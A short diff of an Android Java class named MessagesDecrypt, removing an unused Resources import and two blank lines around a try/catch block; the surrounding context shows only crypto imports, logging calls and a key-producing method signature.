@@ -14,7 +14,6 @@ import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
 import android.content.Context;
-import android.content.res.Resources;
 
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.ByteArray;
@@ -92,9 +91,7 @@ public class MessagesDecrypt {
 				Check.log(TAG + " Exception");
 				Check.log(ex);
 			}
-
 		}
-
 	}
 
 	public static SecretKey produceKey(String key) {
